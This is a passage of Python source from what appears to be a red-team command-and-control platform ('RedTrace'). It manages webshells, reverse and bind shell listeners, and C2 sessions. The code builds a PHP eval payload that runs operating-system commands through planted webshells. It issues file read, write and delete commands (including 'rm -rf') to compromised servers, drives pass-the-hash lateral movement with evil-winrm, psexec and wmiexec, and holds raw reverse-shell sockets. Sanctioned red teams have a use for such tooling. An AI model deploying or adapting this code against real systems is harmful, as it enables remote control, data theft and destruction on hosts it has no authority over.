from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import os
import secrets
import shlex
import shutil
import socket
import subprocess
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from typing import Any

import requests

from redtrace.board.storage import next_fact_id, utcnow
from redtrace.config_secrets import atomic_write_bytes
from redtrace.server import db
from redtrace.server.event_hub import event_hub

LOG = logging.getLogger(__name__)

RESOURCE_KINDS = {
    "webshell",
    "c2_listener",
    "c2_session",
    "c2_payload",
    "c2_profile",
    "proxy",
    "file",
    "credential_ref",
    "plugin",
    "result",
}
EXECUTABLE_KINDS = {"webshell", "plugin"}
RISK_LEVELS = {"low", "medium", "high", "critical"}
TERMINAL_TASK_STATES = {"succeeded", "failed", "cancelled", "rejected"}
MAX_RESULT_BYTES = 2 * 1024 * 1024
C2_STALE_SECONDS = 120
SUPPORTED_LISTENER_TYPES = {"http_beacon", "https_beacon", "tcp_reverse", "tcp_bind", "external_c2"}


def json_load(value: str | None, fallback: Any) -> Any:
    if not value:
        return fallback
    try:
        return json.loads(value)
    except (TypeError, json.JSONDecodeError):
        return fallback


def json_dump(value: Any) -> str:
    return json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def resource_id(kind: str) -> str:
    prefixes = {
        "webshell": "ws",
        "c2_listener": "lis",
        "c2_session": "ses",
        "c2_payload": "pay",
        "c2_profile": "prf",
        "proxy": "prx",
        "file": "fil",
        "credential_ref": "cred",
        "plugin": "plg",
        "result": "res",
    }
    return f"{prefixes.get(kind, 'rsc')}_{uuid.uuid4().hex[:12]}"


def task_id() -> str:
    return f"op_{uuid.uuid4().hex[:14]}"


def result_id() -> str:
    return f"out_{uuid.uuid4().hex[:14]}"


def hash_token(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def verify_token(value: str, expected_hash: str) -> bool:
    return bool(value and expected_hash) and hmac.compare_digest(hash_token(value), expected_hash)


def public_resource(row: Any) -> dict[str, Any]:
    item = dict(row)
    secret = json_load(item.pop("secret_json", "{}"), {})
    item["metadata"] = json_load(item.pop("metadata_json", "{}"), {})
    item["has_secret"] = bool(secret)
    if item["kind"] == "credential_ref":
        item["secret"] = secret
    if item["kind"] == "c2_payload" and secret.get("command"):
        item["metadata"]["command"] = secret["command"]
    item["worker_paused"] = bool(item.get("worker_paused"))
    item["locked"] = bool(item.get("locked_by"))
    item["source_project_id"] = item.get("project_id") or item["metadata"].get("source_project_id")
    item["scope"] = "global"
    item["source"] = {
        "project_id": item["source_project_id"],
        "intent_id": item.get("intent_id"),
        "worker": item.get("worker"),
        "task_id": item.get("source_task_id"),
        "created_by_type": item.get("created_by_type"),
        "created_by": item.get("created_by"),
    }
    if item["kind"] == "c2_listener":
        item["checkin_path"] = f"/c2/checkin/{item['id']}"
    if item["kind"] == "c2_session" and str(
        item["metadata"].get("connection_type") or "beacon"
    ).lower() in {"beacon", "agent"}:
        item["poll_path"] = f"/c2/sessions/{item['id']}/poll"
    return item


def public_task(row: Any) -> dict[str, Any]:
    item = dict(row)
    item["input"] = json_load(item.pop("input_json", "{}"), {})
    item["requires_approval"] = bool(item.get("requires_approval"))
    item["cancel_requested"] = bool(item.get("cancel_requested"))
    return item


def public_audit(row: Any) -> dict[str, Any]:
    item = dict(row)
    item["detail"] = json_load(item.pop("detail_json", "{}"), {})
    return item


def audit_event(
    conn,
    *,
    project_id: str | None,
    resource_id_value: str | None,
    task_id_value: str | None,
    actor_type: str,
    actor: str,
    action: str,
    status: str,
    detail: dict[str, Any] | None = None,
) -> None:
    # The URL-level ``_global`` placeholder is a no-project shortcut for
    # shared resources. Persist it as NULL so the FK to ``projects`` keeps
    # holding and the event hub still distinguishes global traffic.
    if project_id == "_global":
        project_id = None
    now = utcnow()
    safe_detail = detail or {}
    cursor = conn.execute(
        """
        INSERT INTO resource_audit_events (
            project_id, resource_id, task_id, actor_type, actor, action,
            status, detail_json, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            project_id,
            resource_id_value,
            task_id_value,
            actor_type,
            actor,
            action,
            status,
            json_dump(safe_detail),
            now,
        ),
    )
    event_hub.publish(
        project_id or "__global__",
        {
            "type": "resource.audit",
            "id": cursor.lastrowid,
            "project_id": project_id,
            "resource_id": resource_id_value,
            "task_id": task_id_value,
            "actor_type": actor_type,
            "actor": actor,
            "action": action,
            "status": status,
            "detail": safe_detail,
            "created_at": now,
        },
    )


def expire_stale_c2_sessions(conn, project_id: str | None = None) -> list[str]:
    cutoff = (datetime.now(timezone.utc) - timedelta(seconds=C2_STALE_SECONDS)).strftime(
        "%Y-%m-%dT%H:%M:%SZ"
    )
    clauses = ["kind = 'c2_session'", "status = 'available'", "last_seen_at IS NOT NULL", "last_seen_at < ?"]
    params: list[Any] = [cutoff]
    if project_id is not None:
        clauses.append("project_id = ?")
        params.append(project_id)
    candidates = conn.execute(
        f"SELECT id, project_id, metadata_json FROM shared_resources WHERE {' AND '.join(clauses)}",
        params,
    ).fetchall()
    rows = [
        row
        for row in candidates
        if str(json_load(row["metadata_json"], {}).get("connection_type") or "beacon").lower()
        in {"beacon", "agent"}
    ]
    if not rows:
        return []
    now = utcnow()
    ids = [row["id"] for row in rows]
    for row in rows:
        session_id = row["id"]
        conn.execute(
            "UPDATE shared_resources SET status = 'offline', updated_at = ? WHERE id = ?",
            (now, session_id),
        )
        audit_event(
            conn,
            project_id=row["project_id"],
            resource_id_value=session_id,
            task_id_value=None,
            actor_type="system",
            actor="session-monitor",
            action="c2.session_offline",
            status="offline",
        )
    return ids


def _fact_summary(kind: str, name: str, rid: str, target: str, summary: str) -> str:
    kind_labels = {
        "webshell": "WebShell",
        "c2_listener": "C2 Listener",
        "c2_session": "C2 Session",
        "c2_payload": "C2 载荷",
        "c2_profile": "C2 流量伪装",
        "proxy": "代理通道",
        "file": "文件",
        "credential_ref": "凭据引用",
        "plugin": "插件",
        "result": "任务结果",
    }
    parts = [f"[resource:{rid}] 已登记{kind_labels.get(kind, kind)}：{name}"]
    if target:
        parts.append(f"目标 {target}")
    if summary:
        parts.append(summary[:240])
    return "；".join(parts)


def create_resource(
    conn,
    *,
    project_id: str | None,
    kind: str,
    name: str,
    target: str = "",
    summary: str = "",
    status: str = "available",
    metadata: dict[str, Any] | None = None,
    secret: dict[str, Any] | None = None,
    actor_type: str,
    actor: str,
    worker: str | None = None,
    intent_id: str | None = None,
    fact_id: str | None = None,
    parent_resource_id: str | None = None,
    source_task_id: str | None = None,
    publish_fact: bool = True,
) -> tuple[dict[str, Any], str | None]:
    if kind not in RESOURCE_KINDS:
        raise ValueError(f"unsupported resource kind: {kind}")
    rid = resource_id(kind)
    now = utcnow()
    resource_metadata = dict(metadata or {})
    if project_id is not None:
        resource_metadata.setdefault("source_project_id", project_id)
    resource_secret = dict(secret or {})
    secret_once: str | None = None
    if kind == "c2_listener":
        listener_type = str(resource_metadata.get("listener_type") or "http_beacon").lower()
        if listener_type not in SUPPORTED_LISTENER_TYPES:
            raise ValueError(f"unsupported listener type: {listener_type}")
        resource_metadata["listener_type"] = listener_type
        secret_once = secrets.token_urlsafe(32)
        resource_secret = {
            **resource_secret,
            "listener_token_sha256": hash_token(secret_once),
            "listener_token": secret_once,
        }
        status = status if status in {"available", "offline"} else "offline"
    if kind == "c2_session":
        connection_type = str(resource_metadata.get("connection_type") or "beacon").lower()
        if connection_type in {"reverse", "reverse_shell"} and parent_resource_id is None:
            raise ValueError("reverse shell sessions must reference a C2 listener")
        credential_id = str(resource_metadata.get("credential_id") or "")
        if credential_id:
            credential = conn.execute(
                "SELECT metadata_json, secret_json FROM shared_resources WHERE id = ? AND kind = 'credential_ref'",
                (credential_id,),
            ).fetchone()
            if credential is None:
                raise ValueError("credential resource not found")
            resource_metadata = {
                **json_load(credential["metadata_json"], {}),
                **resource_metadata,
            }
            resource_secret = {
                **json_load(credential["secret_json"], {}),
                **resource_secret,
            }
        if connection_type in {"beacon", "agent"} and "session_token_sha256" not in resource_secret:
            secret_once = secrets.token_urlsafe(32)
            resource_secret["session_token_sha256"] = hash_token(secret_once)
    if parent_resource_id is not None:
        parent = conn.execute(
            "SELECT id FROM shared_resources WHERE id = ?",
            (parent_resource_id,),
        ).fetchone()
        if parent is None:
            raise ValueError("parent resource not found")
    conn.execute(
        """
        INSERT INTO shared_resources (
            id, project_id, kind, name, status, target, summary, metadata_json,
            secret_json, created_by_type, created_by, worker, intent_id, fact_id,
            parent_resource_id, source_task_id, created_at, updated_at, last_seen_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            rid,
            project_id,
            kind,
            name.strip(),
            status,
            target.strip(),
            summary.strip(),
            json_dump(resource_metadata),
            json_dump(resource_secret),
            actor_type,
            actor,
            worker,
            intent_id,
            fact_id,
            parent_resource_id,
            source_task_id,
            now,
            now,
            now if kind == "c2_session" else None,
        ),
    )
    if project_id is not None and publish_fact and fact_id is None and kind in {
        "webshell",
        "c2_listener",
        "c2_session",
        "c2_payload",
        "c2_profile",
        "proxy",
        "credential_ref",
        "plugin",
        "result",
    }:
        fid = next_fact_id(conn, project_id)
        conn.execute(
            "INSERT INTO facts (id, project_id, description) VALUES (?, ?, ?)",
            (fid, project_id, _fact_summary(kind, name, rid, target, summary)),
        )
        conn.execute(
            "UPDATE shared_resources SET fact_id = ? WHERE id = ?",
            (fid, rid),
        )
    audit_event(
        conn,
        project_id=project_id,
        resource_id_value=rid,
        task_id_value=source_task_id,
        actor_type=actor_type,
        actor=actor,
        action="resource.register",
        status="succeeded",
        detail={"kind": kind, "name": name, "target": target, "intent_id": intent_id},
    )
    row = conn.execute("SELECT * FROM shared_resources WHERE id = ?", (rid,)).fetchone()
    return public_resource(row), secret_once


def store_result(conn, project_id: str | None, task_id_value: str, content: str) -> tuple[str, str]:
    encoded = content.encode("utf-8", errors="replace")
    if len(encoded) > MAX_RESULT_BYTES:
        encoded = encoded[:MAX_RESULT_BYTES]
        content = encoded.decode("utf-8", errors="replace") + "\n\n[output truncated by RedTrace]"
        encoded = content.encode("utf-8")
    rid = result_id()
    digest = hashlib.sha256(encoded).hexdigest()
    resource = conn.execute(
        """
        SELECT r.kind FROM operation_tasks t
        JOIN shared_resources r ON r.id = t.resource_id
        WHERE t.id = ?
        """,
        (task_id_value,),
    ).fetchone()
    category = (
        "webshell"
        if resource is not None and resource["kind"] == "webshell"
        else "c2"
        if resource is not None
        and resource["kind"]
        in {"c2_listener", "c2_session", "c2_payload", "c2_profile"}
        else None
    )
    conn.execute(
        """
        INSERT INTO operation_results (
            id, project_id, task_id, content_type, content, size_bytes, sha256, created_at
        ) VALUES (?, ?, ?, 'text/plain; charset=utf-8', ?, ?, ?, ?)
        """,
        (rid, project_id, task_id_value, content, len(encoded), digest, utcnow()),
    )
    if category:
        atomic_write_bytes(
            db.output_root(category) / "results" / f"{task_id_value}-{rid}.txt",
            encoded,
        )
    return rid, f"/projects/{project_id or '_global'}/operations/results/{rid}"


def output_summary(content: str, limit: int = 0) -> str:
    compact = " ".join(content.split())
    if limit and len(compact) > limit:
        return compact[:limit] + "…"
    return compact


def _webshell_command(action: str, arguments: dict[str, Any]) -> tuple[str, str | None]:
    if action == "command":
        command = str(arguments.get("command", "")).strip()
        if not command:
            raise ValueError("command is required")
        return command, None
    if action == "probe":
        token = f"RT_{secrets.token_hex(8)}"
        return f"printf %s {shlex.quote(token)}", token
    path = str(arguments.get("path", "")).strip()
    if not path:
        raise ValueError("path is required")
    quoted_path = shlex.quote(path)
    if action == "list_files":
        return (
            f"find {quoted_path} -mindepth 1 -maxdepth 1 "
            r"-printf '%y\t%f\t%TY-%Tm-%Td %TH:%TM:%TS\t%s\t%m\n'",
            None,
        )
    if action == "read_file":
        return f"base64 -- {quoted_path}", None
    if action == "write_file":
        if "content_base64" not in arguments:
            raise ValueError("content_base64 is required")
        content_base64 = str(arguments.get("content_base64", "")).strip()
        return (
            f"printf %s {shlex.quote(content_base64)} | base64 -d > {quoted_path}",
            None,
        )
    if action == "create_directory":
        return f"mkdir -p -- {quoted_path}", None
    if action == "create_file":
        return f"touch -- {quoted_path}", None
    if action == "move_file":
        destination = str(arguments.get("destination", "")).strip()
        if not destination:
            raise ValueError("destination is required")
        return f"mv -- {quoted_path} {shlex.quote(destination)}", None
    if action == "delete_file":
        return f"rm -rf -- {quoted_path}", None
    raise ValueError(f"unsupported WebShell action: {action}")


def _webshell_target_os(metadata: dict[str, Any]) -> str:
    configured = str(metadata.get("os") or "auto").strip().lower()
    if configured in {"linux", "windows"}:
        return configured
    shell_type = str(metadata.get("shell_type") or "").strip().lower()
    return "windows" if shell_type in {"asp", "aspx"} else "linux"


def _webshell_command_for_os(
    action: str,
    arguments: dict[str, Any],
    metadata: dict[str, Any],
) -> tuple[str, str | None]:
    if action in {"command", "probe"}:
        if action == "command":
            command = str(arguments.get("command", "")).strip()
            if not command:
                raise ValueError("command is required")
            return command, None
        token = f"RT_{secrets.token_hex(8)}"
        if _webshell_target_os(metadata) == "windows":
            return f"echo {token}", token
        return f"printf %s {shlex.quote(token)}", token

    target_os = _webshell_target_os(metadata)
    path = str(arguments.get("path", "")).strip()
    if not path:
        raise ValueError("path is required")
    if target_os == "windows":
        quoted = '"' + path.replace('"', '""').replace("/", "\\") + '"'
        escaped_path = path.replace("'", "''")
        if action == "list_files":
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"Get-ChildItem -Force -LiteralPath '{escaped_path}' | ForEach-Object {{ "
                "$kind=if($_.PSIsContainer){'d'}else{'f'}; "
                "$size=if($_.PSIsContainer){0}else{$_.Length}; "
                "$mode=if($_.PSIsContainer){'d----'}else{'-a---'}; "
                "Write-Output ($kind+[char]9+$_.Name+[char]9+"
                "$_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')+[char]9+$size+[char]9+$mode) }\"",
                None,
            )
        if action == "read_file":
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{escaped_path}'))\"",
                None,
            )
        if action == "write_file":
            if "content_base64" not in arguments:
                raise ValueError("content_base64 is required")
            content = str(arguments.get("content_base64", "")).strip()
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"[IO.File]::WriteAllBytes('{escaped_path}',[Convert]::FromBase64String('{content}'))\"",
                None,
            )
        if action == "create_directory":
            return f"mkdir {quoted}", None
        if action == "create_file":
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"New-Item -ItemType File -Force -LiteralPath '{escaped_path}' | Out-Null\"",
                None,
            )
        if action == "move_file":
            destination = str(arguments.get("destination", "")).strip()
            if not destination:
                raise ValueError("destination is required")
            escaped_destination = destination.replace("'", "''")
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"Move-Item -Force -LiteralPath '{escaped_path}' "
                f"-Destination '{escaped_destination}'\"",
                None,
            )
        if action == "delete_file":
            return (
                "powershell -NoProfile -NonInteractive -Command "
                f"\"Remove-Item -Recurse -Force -LiteralPath '{escaped_path}'\"",
                None,
            )
        raise ValueError(f"unsupported WebShell action: {action}")
    return _webshell_command(action, arguments)


def _php_eval_payload(command: str) -> tuple[str, str, str]:
    """Build a marker-delimited payload for one-line PHP eval shells.

    AntSword-style shells such as ``@eval($_POST['cmd']);`` expect PHP source
    in the password parameter, not the operating-system command itself.
    """

    marker = secrets.token_hex(8)
    begin = f"RTBEGIN{marker}"
    end = f"RTEND{marker}"
    encoded = base64.b64encode(command.encode("utf-8")).decode("ascii")
    payload = (
        "@set_time_limit(0);@ini_set('display_errors','0');"
        f"$c=base64_decode('{encoded}');$o='';"
        "if(function_exists('shell_exec')){$o=@shell_exec($c.' 2>&1');}"
        "elseif(function_exists('exec')){$a=array();@exec($c.' 2>&1',$a);$o=implode(\"\\n\",$a);}"
        "else{ob_start();@system($c.' 2>&1');$o=ob_get_clean();}"
        f"echo '{begin}'.base64_encode((string)$o).'{end}';"
    )
    return payload, begin, end


def _decode_webshell_response(
    response: Any,
    metadata: dict[str, Any],
    markers: tuple[str, str] | None,
) -> str:
    encoding = str(metadata.get("encoding") or "auto").strip().lower()
    if encoding in {"", "auto"}:
        encoding = getattr(response, "encoding", None) or "utf-8"
    if encoding == "gb18030":
        encoding = "gb18030"
    elif encoding == "gbk":
        encoding = "gbk"
    raw = getattr(response, "content", None)
    if isinstance(raw, (bytes, bytearray)):
        text = bytes(raw).decode(encoding, errors="replace")
    else:
        text = str(getattr(response, "text", ""))
    if markers is None:
        return text
    begin, end = markers
    start = text.find(begin)
    finish = text.find(end, start + len(begin)) if start >= 0 else -1
    if start < 0 or finish < 0:
        return text
    encoded = text[start + len(begin) : finish].strip()
    try:
        return base64.b64decode(encoded, validate=True).decode(encoding, errors="replace")
    except (ValueError, UnicodeError):
        return text


def execute_webshell_config(
    *,
    url: str,
    metadata: dict[str, Any],
    secret: dict[str, Any],
    command: str,
    probe_token: str | None = None,
) -> str:
    if not url:
        raise ValueError("WebShell target URL is empty")
    password = str(secret.get("password", ""))
    command_param = str(metadata.get("command_param") or password or "cmd").strip()
    shell_type = str(metadata.get("shell_type") or "").strip().lower()
    protocol = str(metadata.get("protocol") or ("eval" if shell_type == "php" else "raw")).strip().lower()
    wire_command = command
    markers: tuple[str, str] | None = None
    if shell_type == "php" and protocol in {"auto", "eval", "antsword"}:
        wire_command, begin, end = _php_eval_payload(command)
        markers = (begin, end)
    payload: dict[str, str] = {command_param: wire_command}
    password_param = str(metadata.get("password_param", "")).strip()
    if password_param and password:
        payload[password_param] = password
    headers = {
        str(key): str(value)
        for key, value in dict(metadata.get("headers") or {}).items()
        if str(key).strip()
    }
    method = str(metadata.get("method", "POST")).upper()
    timeout = min(max(float(metadata.get("timeout", 20)), 1.0), 60.0)
    verify_tls = bool(metadata.get("verify_tls", True))
    response = requests.request(
        method,
        url,
        params=payload if method == "GET" else None,
        data=None if method == "GET" else payload,
        headers=headers,
        timeout=timeout,
        verify=verify_tls,
    )
    response.raise_for_status()
    text = _decode_webshell_response(response, metadata, markers)
    if probe_token is not None and probe_token not in text:
        raise RuntimeError("WebShell responded without the one-time probe token")
    return text


def probe_webshell_config(
    *,
    url: str,
    metadata: dict[str, Any],
    secret: dict[str, Any],
) -> str:
    command, token = _webshell_command_for_os("probe", {}, metadata)
    return execute_webshell_config(
        url=url,
        metadata=metadata,
        secret=secret,
        command=command,
        probe_token=token,
    )


def execute_webshell(resource: Any, task: Any) -> str:
    metadata = json_load(resource["metadata_json"], {})
    secret = json_load(resource["secret_json"], {})
    arguments = json_load(task["input_json"], {})
    command, probe_token = _webshell_command_for_os(task["action"], arguments, metadata)
    return execute_webshell_config(
        url=resource["target"],
        metadata=metadata,
        secret=secret,
        command=command,
        probe_token=probe_token,
    )


def execute_plugin(resource: Any, task: Any) -> str:
    metadata = json_load(resource["metadata_json"], {})
    secret = json_load(resource["secret_json"], {})
    action = task["action"]
    allowed_actions = metadata.get("actions") or []
    if allowed_actions and action not in allowed_actions:
        raise ValueError(f"plugin action is not declared: {action}")
    endpoint = str(secret.get("endpoint") or resource["target"]).strip()
    if not endpoint:
        raise ValueError("plugin endpoint is empty")
    headers = {"Content-Type": "application/json", "Accept": "application/json, text/plain"}
    token = str(secret.get("token", "")).strip()
    if token:
        headers["Authorization"] = f"Bearer {token}"
    headers.update(
        {
            str(key): str(value)
            for key, value in dict(metadata.get("headers") or {}).items()
            if str(key).strip()
        }
    )
    payload = {
        "action": action,
        "arguments": json_load(task["input_json"], {}),
        "project_id": task["project_id"],
        "resource_id": resource["id"],
        "task_id": task["id"],
    }
    timeout = min(max(float(metadata.get("timeout", 60)), 1.0), 300.0)
    response = requests.post(endpoint, json=payload, headers=headers, timeout=timeout)
    response.raise_for_status()
    return response.text


def execute_direct_session(resource: Any, task: Any) -> str:
    metadata = json_load(resource["metadata_json"], {})
    secret = json_load(resource["secret_json"], {})
    arguments = json_load(task["input_json"], {})
    command = str(arguments.get("command") or "")
    if not command:
        raise ValueError("command is required")
    shell_type = str(metadata.get("shell_type") or "custom").lower()
    connection_type = str(metadata.get("connection_type") or "direct").lower()
    if connection_type == "external_c2":
        endpoint = str(secret.get("endpoint") or metadata.get("endpoint") or "").rstrip("/")
        if not endpoint:
            raise ValueError("external C2 adapter endpoint is required")
        headers = {"Accept": "application/json, text/plain"}
        if secret.get("token"):
            headers["Authorization"] = f"Bearer {secret['token']}"
        response = requests.post(
            endpoint,
            json={
                "framework": metadata.get("framework") or shell_type,
                "session_id": metadata.get("external_session_id") or resource["target"],
                "action": task["action"],
                "arguments": arguments,
            },
            headers=headers,
            timeout=min(max(float(arguments.get("timeout") or 60), 1), 300),
        )
        response.raise_for_status()
        return response.text

    target = resource["target"]
    username = str(secret.get("username") or metadata.get("username") or "")
    password = str(secret.get("password") or secret.get("value") or "")
    credential_hash = str(secret.get("hash") or secret.get("ntlm_hash") or "")
    if not credential_hash and str(metadata.get("credential_type") or "").lower() == "hash":
        credential_hash, password = password, ""
    domain = str(secret.get("domain") or metadata.get("domain") or "")
    timeout = min(max(float(arguments.get("timeout") or 60), 1), 300)
    stdin_input: str | None = None
    process_env: dict[str, str] | None = None
    if shell_type == "ssh":
        executable = str(metadata.get("executable") or "ssh")
        destination = f"{username}@{target}" if username else target
        argv = [executable, "-o", "StrictHostKeyChecking=accept-new"]
        port = int(metadata.get("port") or 22)
        if port != 22:
            argv.extend(["-p", str(port)])
        key_path = str(secret.get("private_key_path") or "")
        if key_path:
            argv.extend(["-o", "BatchMode=yes", "-i", key_path])
        elif password:
            sshpass = str(metadata.get("sshpass_executable") or shutil.which("sshpass") or "")
            if not sshpass:
                raise RuntimeError("password SSH requires sshpass; use an SSH key or configure sshpass_executable")
            argv = [sshpass, "-e", *argv]
            process_env = {**os.environ, "SSHPASS": password}
        else:
            argv.extend(["-o", "BatchMode=yes"])
        argv.extend([destination, command])
    elif shell_type == "evil_winrm":
        argv = [str(metadata.get("executable") or "evil-winrm"), "-i", target, "-u", username]
        if password:
            argv.extend(["-p", password])
        elif credential_hash:
            argv.extend(["-H", credential_hash])
        stdin_input = f"{command}\nexit\n"
    elif shell_type in {"psexec", "wmi"}:
        executable = str(metadata.get("executable") or ("psexec.py" if shell_type == "psexec" else "wmiexec.py"))
        principal = f"{domain}/{username}" if domain else username
        credential = f"{principal}:{password}@{target}" if password else f"{principal}@{target}"
        argv = [executable]
        if credential_hash:
            argv.extend(["-hashes", credential_hash])
        argv.extend([credential, command])
    else:
        argv = [str(metadata.get("executable") or shell_type)]
        argv.extend(str(item) for item in metadata.get("arguments", []))
        argv.extend([target, command])
    completed = subprocess.run(
        argv,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
        input=stdin_input,
        env=process_env,
    )
    output = (completed.stdout or "") + (completed.stderr or "")
    if completed.returncode:
        raise RuntimeError(output.strip() or f"{shell_type} exited with {completed.returncode}")
    return output


class ShellBroker:
    """Own raw reverse/bind sockets and expose them through the normal task queue."""

    def __init__(self) -> None:
        self._listeners: dict[str, socket.socket] = {}
        self._external_stops: dict[str, threading.Event] = {}
        self._sessions: dict[str, socket.socket] = {}
        self._session_listener: dict[str, str] = {}
        self._session_locks: dict[str, threading.Lock] = {}
        self._lock = threading.RLock()

    def start_listener(self, resource: Any) -> None:
        metadata = json_load(resource["metadata_json"], {})
        listener_type = str(metadata.get("listener_type") or "").lower()
        if listener_type in {"external_c2", "msf", "sliver", "cobalt_strike", "custom"}:
            self.stop_listener(resource["id"])
            stop = threading.Event()
            with self._lock:
                self._external_stops[resource["id"]] = stop
            threading.Thread(
                target=self._sync_external,
                args=(dict(resource), stop),
                daemon=True,
                name=f"redtrace-{listener_type}-{resource['id']}",
            ).start()
            return
        if listener_type not in {"tcp_reverse", "tcp_bind"}:
            return
        self.stop_listener(resource["id"])
        target = self._listener_target(metadata, listener_type)
        thread_target = self._accept_reverse if listener_type == "tcp_reverse" else self._connect_bind
        threading.Thread(
            target=thread_target,
            args=(dict(resource), *target),
            daemon=True,
            name=f"redtrace-{listener_type}-{resource['id']}",
        ).start()

    def stop_listener(self, listener_id: str) -> None:
        with self._lock:
            server = self._listeners.pop(listener_id, None)
            stop = self._external_stops.pop(listener_id, None)
            session_ids = [sid for sid, parent in self._session_listener.items() if parent == listener_id]
        if stop is not None:
            stop.set()
        if server is not None:
            try:
                server.close()
            except OSError:
                pass
        for session_id in session_ids:
            self._drop_session(session_id)

    def shutdown(self) -> None:
        """Release listener and session transports while keeping the broker reusable."""
        with self._lock:
            listener_ids = set(self._listeners) | set(self._external_stops)
            session_ids = set(self._sessions)
        for listener_id in listener_ids:
            self.stop_listener(listener_id)
        for session_id in session_ids:
            self._drop_session(session_id)

    def has_session(self, session_id: str) -> bool:
        with self._lock:
            return session_id in self._sessions

    def execute(self, session_id: str, command: str, timeout: float = 20.0) -> str:
        with self._lock:
            channel = self._sessions.get(session_id)
            channel_lock = self._session_locks.setdefault(session_id, threading.Lock())
        if channel is None:
            raise RuntimeError("raw shell channel is offline")
        timeout = min(max(float(timeout), 0.5), 300.0)
        with channel_lock:
            try:
                channel.sendall(command.encode("utf-8") + b"\n")
                chunks: list[bytes] = []
                deadline = time.monotonic() + timeout
                last_data = time.monotonic()
                while time.monotonic() < deadline:
                    try:
                        chunk = channel.recv(65536)
                    except socket.timeout:
                        if chunks and time.monotonic() - last_data >= 0.5:
                            break
                        continue
                    if not chunk:
                        raise ConnectionError("shell channel closed")
                    chunks.append(chunk)
                    last_data = time.monotonic()
                return b"".join(chunks).decode("utf-8", errors="replace")
            except (OSError, ConnectionError):
                self._drop_session(session_id)
                raise

    @staticmethod
    def _listener_target(metadata: dict[str, Any], listener_type: str) -> tuple[str, int]:
        host_key = "target_host" if listener_type == "tcp_bind" else "bind_host"
        host = str(metadata.get(host_key) or ("127.0.0.1" if listener_type == "tcp_bind" else "0.0.0.0"))
        port = int(metadata.get("bind_port") or metadata.get("target_port") or 0)
        if not 1 <= port <= 65535:
            raise ValueError("listener port must be between 1 and 65535")
        return host, port

    def _accept_reverse(self, resource: dict[str, Any], host: str, port: int) -> None:
        server = socket.socket(socket.AF_INET6 if ":" in host else socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((host, port))
            server.listen(32)
            server.settimeout(1.0)
            with self._lock:
                self._listeners[resource["id"]] = server
            while True:
                with self._lock:
                    if self._listeners.get(resource["id"]) is not server:
                        return
                try:
                    channel, peer = server.accept()
                except socket.timeout:
                    continue
                except OSError:
                    return
                self._attach_channel(resource, channel, peer, "reverse")
        except OSError as exc:
            LOG.error("C2 reverse listener failed id=%s error=%s", resource["id"], exc)
            self._mark_listener(resource["id"], "degraded", str(exc))
        finally:
            try:
                server.close()
            except OSError:
                pass

    def _connect_bind(self, resource: dict[str, Any], host: str, port: int) -> None:
        try:
            channel = socket.create_connection((host, port), timeout=10.0)
            self._attach_channel(resource, channel, (host, port), "bind")
        except OSError as exc:
            LOG.error("C2 bind connector failed id=%s error=%s", resource["id"], exc)
            self._mark_listener(resource["id"], "degraded", str(exc))

    def _sync_external(self, resource: dict[str, Any], stop: threading.Event) -> None:
        metadata = json_load(resource["metadata_json"], {})
        secret = json_load(resource["secret_json"], {})
        framework = str(metadata.get("listener_type") or "custom")
        endpoint = str(secret.get("adapter_endpoint") or metadata.get("adapter_endpoint") or "").rstrip("/")
        if not endpoint:
            self._mark_listener(resource["id"], "degraded", "external C2 adapter_endpoint is required")
            return
        headers = {"Accept": "application/json"}
        if secret.get("token"):
            headers["Authorization"] = f"Bearer {secret['token']}"
        interval = min(max(float(metadata.get("sync_interval") or 5), 1), 300)
        while not stop.is_set():
            try:
                response = requests.get(
                    f"{endpoint}/sessions",
                    params={"framework": framework},
                    headers=headers,
                    timeout=min(interval, 30),
                )
                response.raise_for_status()
                payload = response.json()
                sessions = payload.get("sessions", []) if isinstance(payload, dict) else payload
                if not isinstance(sessions, list):
                    raise ValueError("external C2 adapter sessions response must be a list")
                self._upsert_external_sessions(resource, framework, endpoint, secret, sessions)
            except Exception as exc:
                LOG.warning("external C2 sync failed id=%s error=%s", resource["id"], exc)
            stop.wait(interval)

    @staticmethod
    def _upsert_external_sessions(
        listener: dict[str, Any],
        framework: str,
        endpoint: str,
        listener_secret: dict[str, Any],
        sessions: list[Any],
    ) -> None:
        now = utcnow()
        seen: set[str] = set()
        with db.get_conn() as conn:
            current_listener = conn.execute(
                "SELECT project_id, metadata_json FROM shared_resources WHERE id = ?",
                (listener["id"],),
            ).fetchone()
            resource_project_id = current_listener["project_id"] if current_listener is not None else None
            listener_metadata = json_load(
                current_listener["metadata_json"] if current_listener is not None else listener.get("metadata_json"),
                {},
            )
            source_project_id = resource_project_id or listener_metadata.get("source_project_id")
            for raw in sessions:
                if not isinstance(raw, dict):
                    continue
                external_id = str(raw.get("id") or raw.get("session_id") or raw.get("external_id") or "")
                if not external_id:
                    continue
                seen.add(external_id)
                row = conn.execute(
                    "SELECT id FROM shared_resources WHERE kind = 'c2_session' AND parent_resource_id = ? AND target = ?",
                    (listener["id"], external_id),
                ).fetchone()
                session_metadata = {
                    **raw,
                    **({"source_project_id": source_project_id} if source_project_id else {}),
                    "framework": framework,
                    "connection_type": "external_c2",
                    "shell_type": str(raw.get("shell_type") or framework),
                    "external_session_id": external_id,
                }
                if row is None:
                    create_resource(
                        conn,
                        project_id=resource_project_id,
                        kind="c2_session",
                        name=str(raw.get("name") or raw.get("hostname") or f"{framework}:{external_id}"),
                        target=external_id,
                        summary=str(raw.get("summary") or f"{framework} session"),
                        metadata=session_metadata,
                        secret={
